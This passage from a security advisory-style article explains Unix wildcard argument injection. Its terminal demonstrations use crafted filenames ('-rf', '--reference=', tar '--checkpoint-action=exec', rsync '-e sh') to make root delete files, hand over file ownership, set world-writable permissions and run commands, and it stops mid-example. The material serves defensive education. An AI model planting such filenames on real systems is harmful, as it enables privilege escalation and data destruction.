<span class='line-number'>421</span>
<span class='line-number'>422</span>
<span class='line-number'>423</span>
<span class='line-number'>424</span>
<span class='line-number'>425</span>
<span class='line-number'>426</span>
<span class='line-number'>427</span>
<span class='line-number'>428</span>
<span class='line-number'>429</span>
<span class='line-number'>430</span>
<span class='line-number'>431</span>
<span class='line-number'>432</span>
<span class='line-number'>433</span>
<span class='line-number'>434</span>
<span class='line-number'>435</span>
<span class='line-number'>436</span>
<span class='line-number'>437</span>
<span class='line-number'>438</span>
<span class='line-number'>439</span>
<span class='line-number'>440</span>
<span class='line-number'>441</span>
<span class='line-number'>442</span>
<span class='line-number'>443</span>
<span class='line-number'>444</span>
<span class='line-number'>445</span>
<span class='line-number'>446</span>
<span class='line-number'>447</span>
<span class='line-number'>448</span>
<span class='line-number'>449</span>
<span class='line-number'>450</span>
<span class='line-number'>451</span>
<span class='line-number'>452</span>
<span class='line-number'>453</span>
<span class='line-number'>454</span>
<span class='line-number'>455</span>
<span class='line-number'>456</span>
<span class='line-number'>457</span>
<span class='line-number'>458</span>
<span class='line-number'>459</span>
<span class='line-number'>460</span>
<span class='line-number'>461</span>
<span class='line-number'>462</span>
<span class='line-number'>463</span>
<span class='line-number'>464</span>
<span class='line-number'>465</span>
<span class='line-number'>466</span>
<span class='line-number'>467</span>
<span class='line-number'>468</span>
<span class='line-number'>469</span>
<span class='line-number'>470</span>
<span class='line-number'>471</span>
<span class='line-number'>472</span>
<span class='line-number'>473</span>
<span class='line-number'>474</span>
<span class='line-number'>475</span>
<span class='line-number'>476</span>
<span class='line-number'>477</span>
<span class='line-number'>478</span>
<span class='line-number'>479</span>
<span class='line-number'>480</span>
<span class='line-number'>481</span>
<span class='line-number'>482</span>
<span class='line-number'>483</span>
<span class='line-number'>484</span>
<span class='line-number'>485</span>
<span class='line-number'>486</span>
<span class='line-number'>487</span>
<span class='line-number'>488</span>
<span class='line-number'>489</span>
<span class='line-number'>490</span>
<span class='line-number'>491</span>
<span class='line-number'>492</span>
<span class='line-number'>493</span>
<span class='line-number'>494</span>
<span class='line-number'>495</span>
<span class='line-number'>496</span>
<span class='line-number'>497</span>
<span class='line-number'>498</span>
<span class='line-number'>499</span>
<span class='line-number'>500</span>
<span class='line-number'>501</span>
<span class='line-number'>502</span>
<span class='line-number'>503</span>
<span class='line-number'>504</span>
<span class='line-number'>505</span>
<span class='line-number'>506</span>
<span class='line-number'>507</span>
<span class='line-number'>508</span>
<span class='line-number'>509</span>
<span class='line-number'>510</span>
<span class='line-number'>511</span>
<span class='line-number'>512</span>
<span class='line-number'>513</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Back To The Future: Unix Wildcards Gone Wild
</span><span class='line'>============================================
</span><span class='line'>- Leon Juranic &lt;leon@defensecode.com&gt; 
</span><span class='line'>- Creation Date: 04/20/2013
</span><span class='line'>- Release Date: 06/25/2014
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Table Of Content:
</span><span class='line'>
</span><span class='line'>===[ 1. Introduction
</span><span class='line'>===[ 2. Unix Wildcards For Dummies
</span><span class='line'>===[ 3. Wildcard Wilderness
</span><span class='line'>===[ 4. Something more useful...
</span><span class='line'>      4.1 Chown file reference trick (file owner hijacking)
</span><span class='line'>      4.2 Chmod file reference trick
</span><span class='line'>      4.3 Tar arbitrary command execution 
</span><span class='line'>      4.4 Rsync arbitrary command execution
</span><span class='line'>===[ 5. Conclusion
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>===[ 1. Introduction
</span><span class='line'>
</span><span class='line'>First of all, this article has nothing to do with modern hacking
</span><span class='line'>techniques like ASLR bypass, ROP exploits, 0day remote kernel exploits or Chrome's
</span><span class='line'>Chain-14-Different-Bugs-To-Get-There... 
</span><span class='line'>Nope, nothing of the above. This article will cover one interesting
</span><span class='line'>old-school Unix hacking technique, that will still work nowadays in 2013.
</span><span class='line'>Hacking technique of which (to my suprise) even many security-related people haven't heard of. 
</span><span class='line'>That is probably because nobody ever really talked about it before.
</span><span class='line'>Why I decided to write on this subject is because, to me personally, it's pretty funny 
</span><span class='line'>to see what can be done with simple Unix wildcard poisoning tricks.
</span><span class='line'>So, from this article, what you can expect is collection of neat *nix hacking
</span><span class='line'>tricks that as far as I know somehow didn't emerge earlier. 
</span><span class='line'>If you wonder how basic Unix tools like 'tar' or 'chown' can lead to
</span><span class='line'>full system compromise, keep on reading.
</span><span class='line'>Ladies and gentleman; take your seats, fasten your belts and hold on tight
</span><span class='line'>- cause we're going straight back to the 80's, right to the Unix shell hacking... 
</span><span class='line'>(Is this bad-hair-rock/groovy disco music playing in the background? I think sooo...)
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>===[ 2. Unix Wildcards For Dummies
</span><span class='line'>
</span><span class='line'>If you already know what Unix wildcards are, and how (and why) are they 
</span><span class='line'>used in shell scripting, you should skip this part.
</span><span class='line'>However, we will include Wildcard definition here just for the sake of
</span><span class='line'>consistency and for potential newcomers.
</span><span class='line'>Wildcard is a character, or set of characters that can be used as a
</span><span class='line'>replacement for some range/class of characters. Wildcards are interpreted 
</span><span class='line'>by shell before any other action is taken.
</span><span class='line'>
</span><span class='line'>Some Shell Wildcards:
</span><span class='line'>
</span><span class='line'>    *     An asterisk matches any number of characters
</span><span class='line'>          in a filename, including none.
</span><span class='line'>    ?     The question mark matches any single
</span><span class='line'>          character.
</span><span class='line'>    [ ]   Brackets enclose a set of characters, any
</span><span class='line'>          one of which may match a single character
</span><span class='line'>          at that position.
</span><span class='line'>    -     A hyphen used within [ ] denotes a range of
</span><span class='line'>          characters.
</span><span class='line'>    ~     A tilde at the beginning of a word expands
</span><span class='line'>          to the name of your home directory.  If you
</span><span class='line'>          append another user's login name to the
</span><span class='line'>          character, it refers to that user's home
</span><span class='line'>          directory.
</span><span class='line'>
</span><span class='line'>Basic example of wildcards usage:
</span><span class='line'>
</span><span class='line'># ls *.php
</span><span class='line'>- List all files with PHP extension
</span><span class='line'>
</span><span class='line'># rm *.gz
</span><span class='line'>- Delete all GZIP files
</span><span class='line'>
</span><span class='line'># cat backup*
</span><span class='line'>- Show content of all files which name is beginning with 'backup' string
</span><span class='line'>
</span><span class='line'># ls test?
</span><span class='line'>- List all files whose name is beginning with string 'test' and has exactly
</span><span class='line'>  one additional character
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>===[ 3. Wildcard Wilderness
</span><span class='line'>
</span><span class='line'>Wildcards as their name states, are "wild" by their nature, but moreover, 
</span><span class='line'>in some cases, wildcards can go berserk.
</span><span class='line'>During the initial phase of playing with this interesting wildcard tricks,
</span><span class='line'>I've talked with dozen old-school Unix admins and security people,
</span><span class='line'>just to find out how many of them knows about wildcard tricks, and
</span><span class='line'>potential danger that they pose.
</span><span class='line'>To my suprise, only two of 20 people stated that they know it's not 
</span><span class='line'>wise to use wildcard, particulary in 'rm' command, because someone
</span><span class='line'>could abuse it with "argument-like-filename". One of them said that he 
</span><span class='line'>heard of that years ago on some basic Linux admin course. Funny.
</span><span class='line'>
</span><span class='line'>Simple trick behind this technique is that when using shell wildcards, 
</span><span class='line'>especially asterisk (*), Unix shell will interpret files beginning with hyphen
</span><span class='line'>(-) character as command line arguments to executed command/program.
</span><span class='line'>That leaves space for variation of classic channeling attack.
</span><span class='line'>Channeling problem will arise when different kind of information channels 
</span><span class='line'>are combined into single channel. Practical case in form of particulary this technique 
</span><span class='line'>is combining arguments and filenames, as different "channels" into single,
</span><span class='line'>because of using shell wildcards.
</span><span class='line'>
</span><span class='line'>Let's check one very basic wildcard argument injection example.
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 20
</span><span class='line'>drwxrwxr-x.  5 leon   leon   4096 Oct 28 17:04 .
</span><span class='line'>drwx------. 22 leon   leon   4096 Oct 28 16:15 ..
</span><span class='line'>drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:04 DIR1
</span><span class='line'>drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:04 DIR2
</span><span class='line'>drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:04 DIR3
</span><span class='line'>-rw-rw-r--.  1 leon   leon      0 Oct 28 17:03 file1.txt
</span><span class='line'>-rw-rw-r--.  1 leon   leon      0 Oct 28 17:03 file2.txt
</span><span class='line'>-rw-rw-r--.  1 leon   leon      0 Oct 28 17:03 file3.txt
</span><span class='line'>-rw-rw-r--.  1 nobody nobody    0 Oct 28 16:38 -rf
</span><span class='line'>
</span><span class='line'>We have directory with few subdirectories and few files in it.
</span><span class='line'>There is also file with '-rf' filename ther owned by the user 'nobody'.
</span><span class='line'>Now, let's run 'rm *' command, and check directory content again.
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# rm *
</span><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 8
</span><span class='line'>drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:05 .
</span><span class='line'>drwx------. 22 leon   leon   4096 Oct 28 16:15 ..
</span><span class='line'>-rw-rw-r--.  1 nobody nobody    0 Oct 28 16:38 -rf
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Directory is totally empty, except for '-rf' file in it.
</span><span class='line'>All files and directories were recursively deleted, and it's pretty obvious what happened...
</span><span class='line'>When we started 'rm' command with asterisk argument, all filenames in current
</span><span class='line'>directory were passed as arguments to 'rm' on command line, exactly same as 
</span><span class='line'>following line:
</span><span class='line'>
</span><span class='line'>[user@defensecode WILD]$ rm DIR1 DIR2 DIR3 file1.txt file2.txt file3.txt -rf
</span><span class='line'>
</span><span class='line'>Since there is '-rf' filename in current directory, 'rm' got -rf option as the
</span><span class='line'>last argument, and all files in current directory were recursively deleted.
</span><span class='line'>We can also check that with strace:
</span><span class='line'>
</span><span class='line'>[leon@defensecode WILD]$ strace rm *
</span><span class='line'>execve("/bin/rm", ["rm", "DIR1", "DIR2", "DIR3", "file1.txt", "file2.txt", 
</span><span class='line'>"file3.txt", "-rf"], [/* 25 vars */]) = 0
</span><span class='line'>              ^- HERE
</span><span class='line'>
</span><span class='line'>Now we know how it's possible to inject arbitrary arguments to the unix
</span><span class='line'>shell programs. In the following chapter we will discuss how we can abuse that
</span><span class='line'>feature to do much more than just recursively delete files.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>===[ 4. Something more useful...
</span><span class='line'>
</span><span class='line'>Since now we know how it's possible to inject arbitrary arguments to
</span><span class='line'>shell commands, let's demonstrate few examples that are more useful,
</span><span class='line'>than just recursive file unlinking.
</span><span class='line'>First, when I stumbled across this wildcard tricks, I was starting to look
</span><span class='line'>for basic and common Unix programs that could be seriously affected 
</span><span class='line'>with arbitrary and unexpected arguments. 
</span><span class='line'>In real-world cases, following examples could be abused in form of direct
</span><span class='line'>interactive shell poisoning, or through some commands started from cron job,
</span><span class='line'>shell scripts, through some web application, and so on.
</span><span class='line'>In all examples below, attacker is hidden behind 'leon' account, and victim 
</span><span class='line'>is of course - root account.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>==[ 4.1 Chown file reference trick (file owner hijacking)
</span><span class='line'>
</span><span class='line'>First really interesting target I've stumbled across is 'chown'. 
</span><span class='line'>Let's say that we have some publicly writeable directory with bunch of
</span><span class='line'>PHP files in there, and root user wants to change owner of all PHP files to 'nobody'.
</span><span class='line'>Pay attention to the file owners in the following files list.
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 52
</span><span class='line'>drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
</span><span class='line'>drwx------. 22 user user 4096 Oct 28 17:34 ..
</span><span class='line'>-rw-rw-r--.  1 user user   66 Oct 28 17:36 admin.php
</span><span class='line'>-rw-rw-r--.  1 user user   34 Oct 28 17:35 ado.php
</span><span class='line'>-rw-rw-r--.  1 user user   80 Oct 28 17:44 config.php
</span><span class='line'>-rw-rw-r--.  1 user user  187 Oct 28 17:44 db.php
</span><span class='line'>-rw-rw-r--.  1 user user  201 Oct 28 17:35 download.php
</span><span class='line'>-rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
</span><span class='line'>-rw-rw-r--.  1 user user   43 Oct 28 17:35 file1.php
</span><span class='line'>-rw-rw-r--.  1 user user   56 Oct 28 17:47 footer.php
</span><span class='line'>-rw-rw-r--.  1 user user  357 Oct 28 17:36 global.php
</span><span class='line'>-rw-rw-r--.  1 user user  225 Oct 28 17:35 header.php
</span><span class='line'>-rw-rw-r--.  1 user user  117 Oct 28 17:35 inc.php
</span><span class='line'>-rw-rw-r--.  1 user user  111 Oct 28 17:38 index.php
</span><span class='line'>-rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
</span><span class='line'>-rw-rw----.  1 user user   66 Oct 28 17:35 password.inc.php
</span><span class='line'>-rw-rw-r--.  1 user user   94 Oct 28 17:35 script.php
</span><span class='line'>
</span><span class='line'>Files in this public directory are mostly owned by the user named 'user', 
</span><span class='line'>and root user will now change that to 'nobody'.
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# chown -R nobody:nobody *.php
</span><span class='line'>
</span><span class='line'>Let's see who owns files now...
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 52
</span><span class='line'>drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
</span><span class='line'>drwx------. 22 user user 4096 Oct 28 17:34 ..
</span><span class='line'>-rw-rw-r--.  1 leon leon   66 Oct 28 17:36 admin.php
</span><span class='line'>-rw-rw-r--.  1 leon leon   34 Oct 28 17:35 ado.php
</span><span class='line'>-rw-rw-r--.  1 leon leon   80 Oct 28 17:44 config.php
</span><span class='line'>-rw-rw-r--.  1 leon leon  187 Oct 28 17:44 db.php
</span><span class='line'>-rw-rw-r--.  1 leon leon  201 Oct 28 17:35 download.php
</span><span class='line'>-rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
</span><span class='line'>-rw-rw-r--.  1 leon leon   43 Oct 28 17:35 file1.php
</span><span class='line'>-rw-rw-r--.  1 leon leon   56 Oct 28 17:47 footer.php
</span><span class='line'>-rw-rw-r--.  1 leon leon  357 Oct 28 17:36 global.php
</span><span class='line'>-rw-rw-r--.  1 leon leon  225 Oct 28 17:35 header.php
</span><span class='line'>-rw-rw-r--.  1 leon leon  117 Oct 28 17:35 inc.php
</span><span class='line'>-rw-rw-r--.  1 leon leon  111 Oct 28 17:38 index.php
</span><span class='line'>-rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
</span><span class='line'>-rw-rw----.  1 leon leon   66 Oct 28 17:35 password.inc.php
</span><span class='line'>-rw-rw-r--.  1 leon leon   94 Oct 28 17:35 script.php
</span><span class='line'>
</span><span class='line'>Something is not right... What happened? Somebody got drunk here.
</span><span class='line'>Superuser tried to change files owner to the user:group 'nobody', but somehow, 
</span><span class='line'>all files are owned by the user 'leon' now.
</span><span class='line'>
</span><span class='line'>If we take closer look, this directory previously contained just the 
</span><span class='line'>following two files created and owned by the user 'leon'.
</span><span class='line'>
</span><span class='line'>-rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
</span><span class='line'>-rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
</span><span class='line'>
</span><span class='line'>Thing is that wildcard character used in 'chown' command line took arbitrary 
</span><span class='line'>'--reference=.drf.php' file and passed it to the chown command at
</span><span class='line'>the command line as an option.
</span><span class='line'>
</span><span class='line'>Let's check chown manual page (man chown):
</span><span class='line'>   --reference=RFILE
</span><span class='line'>          use RFILE's owner and group rather than specifying OWNER:GROUP values
</span><span class='line'>
</span><span class='line'>So in this case, '--reference' option to 'chown' will override 'nobody:nobody'
</span><span class='line'>specified as the root, and new owner of files in this directory will be exactly
</span><span class='line'>same as the owner of '.drf.php', which is in this case user 'leon'.
</span><span class='line'>Just for the record, '.drf' is short for Dummy Reference File. :)
</span><span class='line'>
</span><span class='line'>To conclude, reference option can be abused to change ownership of files to some 
</span><span class='line'>arbitrary user. If we set some other file as argument to the --reference option,
</span><span class='line'>file that's owned by some other user, not 'leon', in that case he would become owner 
</span><span class='line'>of all files in this directory.
</span><span class='line'>
</span><span class='line'>With this simple chown parameter pollution, we can trick root into changing ownership 
</span><span class='line'>of files to arbitrary users, and practically "hijack" files that are of interest to us.
</span><span class='line'>
</span><span class='line'>Even more, if user 'leon' previously created a symbolic link in that directory 
</span><span class='line'>that points to let's say /etc/shadow, ownership of /etc/shadow would also be changed 
</span><span class='line'>to the user 'leon'.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>===[ 4.2 Chmod file reference trick
</span><span class='line'>
</span><span class='line'>Another interesting attack vector similar to previously described 'chown' 
</span><span class='line'>attack is 'chmod'.
</span><span class='line'>Chmod also has --reference option that can be abused to specify arbitrary 
</span><span class='line'>permissions on files selected with asterisk wildcard.
</span><span class='line'>
</span><span class='line'>Chmod manual page (man chmod):
</span><span class='line'>       --reference=RFILE
</span><span class='line'>              use RFILE's mode instead of MODE values
</span><span class='line'>
</span><span class='line'>Example is presented below.
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 68
</span><span class='line'>drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
</span><span class='line'>drwx------. 24 user user  4096 Oct 28 18:32 ..
</span><span class='line'>-rw-rw-r--.  1 user user 20480 Oct 28 19:13 admin.php
</span><span class='line'>-rw-rw-r--.  1 user user    34 Oct 28 17:47 ado.php
</span><span class='line'>-rw-rw-r--.  1 user user   187 Oct 28 17:44 db.php
</span><span class='line'>-rw-rw-r--.  1 user user   201 Oct 28 17:43 download.php
</span><span class='line'>-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
</span><span class='line'>-rw-rw-r--.  1 user user    43 Oct 28 17:35 file1.php
</span><span class='line'>-rw-rw-r--.  1 user user    56 Oct 28 17:47 footer.php
</span><span class='line'>-rw-rw-r--.  1 user user   357 Oct 28 17:36 global.php
</span><span class='line'>-rw-rw-r--.  1 user user   225 Oct 28 17:37 header.php
</span><span class='line'>-rw-rw-r--.  1 user user   117 Oct 28 17:36 inc.php
</span><span class='line'>-rw-rw-r--.  1 user user   111 Oct 28 17:38 index.php
</span><span class='line'>-rw-r--r--.  1 leon leon     0 Oct 29 00:41 --reference=.drf.php
</span><span class='line'>-rw-rw-r--.  1 user user    94 Oct 28 17:38 script.php
</span><span class='line'>
</span><span class='line'>Superuser will now try to set mode 000 on all files.
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# chmod 000 *
</span><span class='line'>
</span><span class='line'>Let's check permissions on files...
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 68
</span><span class='line'>drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
</span><span class='line'>drwx------. 24 user user  4096 Oct 28 18:32 ..
</span><span class='line'>-rwxrwxrwx.  1 user user 20480 Oct 28 19:13 admin.php
</span><span class='line'>-rwxrwxrwx.  1 user user    34 Oct 28 17:47 ado.php
</span><span class='line'>-rwxrwxrwx.  1 user user   187 Oct 28 17:44 db.php
</span><span class='line'>-rwxrwxrwx.  1 user user   201 Oct 28 17:43 download.php
</span><span class='line'>-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
</span><span class='line'>-rwxrwxrwx.  1 user user    43 Oct 28 17:35 file1.php
</span><span class='line'>-rwxrwxrwx.  1 user user    56 Oct 28 17:47 footer.php
</span><span class='line'>-rwxrwxrwx.  1 user user   357 Oct 28 17:36 global.php
</span><span class='line'>-rwxrwxrwx.  1 user user   225 Oct 28 17:37 header.php
</span><span class='line'>-rwxrwxrwx.  1 user user   117 Oct 28 17:36 inc.php
</span><span class='line'>-rwxrwxrwx.  1 user user   111 Oct 28 17:38 index.php
</span><span class='line'>-rw-r--r--.  1 leon leon     0 Oct 29 00:41 --reference=.drf.php
</span><span class='line'>-rwxrwxrwx.  1 user user    94 Oct 28 17:38 script.php
</span><span class='line'>
</span><span class='line'>What happened? Instead of 000, all files are now set to mode 777 because
</span><span class='line'>of the '--reference' option supplied through file name..
</span><span class='line'>Once again, file .drf.php owned by user 'leon' with mode 777 was 
</span><span class='line'>used as reference file and since --reference option is supplied, all files
</span><span class='line'>will be set to mode 777.
</span><span class='line'>Beside just --reference option, attacker can also create another file with 
</span><span class='line'>'-R' filename, to change file permissions on files in all subdirectories recursively.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>===[ 4.3 Tar arbitrary command execution 
</span><span class='line'>
</span><span class='line'>Previous example is nice example of file ownership hijacking. Now, let's go to even 
</span><span class='line'>more interesting stuff like arbitrary command execution. Tar is very common unix program 
</span><span class='line'>for creating and extracting archives.
</span><span class='line'>Common usage for lets say creating archives is:
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# tar cvvf archive.tar *
</span><span class='line'>
</span><span class='line'>So, what's the problem with 'tar'? 
</span><span class='line'>Thing is that tar has many options, and among them, there some pretty interesting
</span><span class='line'>options from arbitrary parameter injection point of view.
</span><span class='line'>
</span><span class='line'>Let's check tar manual page (man tar):
</span><span class='line'>
</span><span class='line'>      --checkpoint[=NUMBER]
</span><span class='line'>              display progress messages every NUMBERth record (default 10)
</span><span class='line'>
</span><span class='line'>       --checkpoint-action=ACTION
</span><span class='line'>              execute ACTION on each checkpoint
</span><span class='line'>
</span><span class='line'>There is '--checkpoint-action' option, that will specify program which will
</span><span class='line'>be executed when checkpoint is reached. Basically, that allows us arbitrary
</span><span class='line'>command execution.
</span><span class='line'>
</span><span class='line'>Check the following directory:
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 72
</span><span class='line'>drwxrwxrwx.  2 user user  4096 Oct 28 19:34 .
</span><span class='line'>drwx------. 24 user user  4096 Oct 28 18:32 ..
</span><span class='line'>-rw-rw-r--.  1 user user 20480 Oct 28 19:13 admin.php
</span><span class='line'>-rw-rw-r--.  1 user user    34 Oct 28 17:47 ado.php
</span><span class='line'>-rw-r--r--.  1 leon leon     0 Oct 28 19:19 --checkpoint=1
</span><span class='line'>-rw-r--r--.  1 leon leon     0 Oct 28 19:17 --checkpoint-action=exec=sh shell.sh
</span><span class='line'>-rw-rw-r--.  1 user user   187 Oct 28 17:44 db.php
</span><span class='line'>-rw-rw-r--.  1 user user   201 Oct 28 17:43 download.php
</span><span class='line'>-rw-rw-r--.  1 user user    43 Oct 28 17:35 file1.php
</span><span class='line'>-rw-rw-r--.  1 user user    56 Oct 28 17:47 footer.php
</span><span class='line'>-rw-rw-r--.  1 user user   357 Oct 28 17:36 global.php
</span><span class='line'>-rw-rw-r--.  1 user user   225 Oct 28 17:37 header.php
</span><span class='line'>-rw-rw-r--.  1 user user   117 Oct 28 17:36 inc.php
</span><span class='line'>-rw-rw-r--.  1 user user   111 Oct 28 17:38 index.php
</span><span class='line'>-rw-rw-r--.  1 user user    94 Oct 28 17:38 script.php
</span><span class='line'>-rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh
</span><span class='line'>
</span><span class='line'>Now, for example, root user wants to create archive of all files in current 
</span><span class='line'>directory.
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# tar cf archive.tar *
</span><span class='line'>
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span><span class='line'>
</span><span class='line'>Boom! What happened? /usr/bin/id command gets executed! We've just achieved arbitrary command
</span><span class='line'>execution under root privileges.
</span><span class='line'>Once again, there are few files created by user 'leon'. 
</span><span class='line'>
</span><span class='line'>-rw-r--r--.  1 leon leon     0 Oct 28 19:19 --checkpoint=1
</span><span class='line'>-rw-r--r--.  1 leon leon     0 Oct 28 19:17 --checkpoint-action=exec=sh shell.sh
</span><span class='line'>-rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh
</span><span class='line'>
</span><span class='line'>Options '--checkpoint=1' and '--checkpoint-action=exec=sh shell.sh' are passed to the 
</span><span class='line'>'tar' program as command line options. Basically, they command tar to execute shell.sh
</span><span class='line'>shell script upon the execution.
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# cat shell.sh
</span><span class='line'>/usr/bin/id
</span><span class='line'>
</span><span class='line'>So, with this tar argument pollution, we can basically execute arbitrary commands 
</span><span class='line'>with privileges of the user that runs tar. As demonstrated on the 'root' account above.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>===[ 4.4 Rsync arbitrary command execution
</span><span class='line'>
</span><span class='line'>Rsync is "a fast, versatile, remote (and local) file-copying tool", that is very
</span><span class='line'>common on Unix systems.
</span><span class='line'>If we check 'rsync' manual page, we can again find options that can be abused for arbitrary 
</span><span class='line'>command execution.
</span><span class='line'>
</span><span class='line'>Rsync manual:
</span><span class='line'>"You use rsync in the same way you use rcp. You must specify a source and a destination, 
</span><span class='line'>one of which may be remote."
</span><span class='line'>
</span><span class='line'>Interesting rsync option from manual:
</span><span class='line'>
</span><span class='line'> -e, --rsh=COMMAND           specify the remote shell to use
</span><span class='line'>     --rsync-path=PROGRAM    specify the rsync to run on remote machine
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Let's abuse one example directly from the 'rsync' manual page.
</span><span class='line'>Following example will copy all C files in local directory to a remote host 'foo' 
</span><span class='line'>in '/src' directory.
</span><span class='line'># rsync -t *.c foo:src/
</span><span class='line'>
</span><span class='line'>Directory content:
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 72
</span><span class='line'>drwxrwxrwx.  2 user user  4096 Mar 28 04:47 .
</span><span class='line'>drwx------. 24 user user  4096 Oct 28 18:32 ..
</span><span class='line'>-rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php
</span><span class='line'>-rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php
</span><span class='line'>-rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php
</span><span class='line'>-rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php
</span><span class='line'>-rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
</span><span class='line'>-rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php
</span><span class='line'>-rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php
</span><span class='line'>-rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php
</span><span class='line'>-rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php
</span><span class='line'>-rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
</span><span class='line'>-rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
</span><span class='line'>-rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php
</span><span class='line'>-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c
</span><span class='line'>
</span><span class='line'>Now root will try to copy all C files to the remote server.
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# rsync -t *.c foo:src/
</span><span class='line'>
</span><span class='line'>rsync: connection unexpectedly closed (0 bytes received so far) [sender]
</span><span class='line'>rsync error: error in rsync protocol data stream (code 12) at io.c(601) [sender=3.0.8]
</span><span class='line'>
</span><span class='line'>Let's see what happened...
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 76
</span><span class='line'>drwxrwxrwx.  2 user user  4096 Mar 28 04:49 .
</span><span class='line'>drwx------. 24 user user  4096 Oct 28 18:32 ..
</span><span class='line'>-rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php
</span><span class='line'>-rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php
</span><span class='line'>-rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php
</span><span class='line'>-rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php
</span><span class='line'>-rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
</span><span class='line'>-rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php
</span><span class='line'>-rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php
</span><span class='line'>-rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php
</span><span class='line'>-rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php
</span><span class='line'>-rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
</span><span class='line'>-rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
</span><span class='line'>-rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php
</span><span class='line'>-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c
</span><span class='line'>-rw-r--r--.  1 root root   101 Mar 28 04:49 shell_output.txt
</span><span class='line'>
</span><span class='line'>There were two files owned by user 'leon', as listed below.
</span><span class='line'>
</span><span class='line'>-rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
</span><span class='line'>-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c
</span><span class='line'>
</span><span class='line'>After 'rsync' execution, new file shell_output.txt whose owner is root 
</span><span class='line'>is created in same directory.
</span><span class='line'>
</span><span class='line'>-rw-r--r--.  1 root root   101 Mar 28 04:49 shell_output.txt
</span><span class='line'>
</span><span class='line'>If we check its content, following data is found.
</span><span class='line'>
